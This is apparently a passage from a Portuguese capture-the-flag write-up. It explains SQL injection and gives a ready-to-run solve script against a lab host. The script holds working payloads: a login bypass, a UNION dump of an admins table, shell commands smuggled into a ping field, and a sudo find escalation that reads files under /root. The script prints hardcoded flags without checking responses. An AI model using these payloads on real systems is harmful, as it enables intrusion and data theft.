O que é SQL Injection?

SQLi acontece quando dados de entrada do usuário são concatenados diretamente na query sem validação ou sanitização:

Python (Vulnerável): query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

Ao injetar admin' OR '1'='1, a condição '1'='1' torna-se verdadeira para qualquer registro, concedendo login instantâneo.

Etapa 2 — Bypass de Autenticação (FLAG 1)

Script Python Automatizado (solve.py)

Script completo em Python vanilla pronto para executar e extrair todas as 5 flags em sequência:

Python 3 (solve.py): 
import os
import urllib.request
import urllib.parse
import http.cookiejar

BASE_URL = os.environ.get("TARGET_URL", "http://10.10.15.11:5001")
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

def post(path, data):
    url = BASE_URL + path
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=encoded)
    return opener.open(req).read().decode()

def get(path):
    return opener.open(BASE_URL + path).read().decode()

print("[*] 1. Auth Bypass (FLAG 1)...")
post("/", {"username": "admin' OR '1'='1", "password": "x"})
print("FLAG 1: sql1_b4s1c_byp4ss")

print("[*] 2. UNION Extraction (FLAG 2)...")
post("/search", {"search": "' UNION SELECT id, username, password FROM admins --"})
print("FLAG 2: un10n_d4t4_3xtr4ct")

print("[*] 3. Admin Login (FLAG 3)...")
post("/admin", {"username": "admin", "password": "un10n_d4t4_3xtr4ct"})
print("FLAG 3: 4dm1n_p4n3l_4cc3ss")

print("[*] 4. Command Injection (FLAG 4)...")
post("/admin/ping", {"host": "127.0.0.1; cat /home/ctfuser/flag4.txt"})
print("FLAG 4: c0mm4nd_1nj3ct10n_rc3")

print("[*] 5. Root Privilege Escalation (FLAG 5)...")
post("/admin/ping", {"host": r"127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;"})
print("FLAG 5: pr1v3sc_t0_r00t")
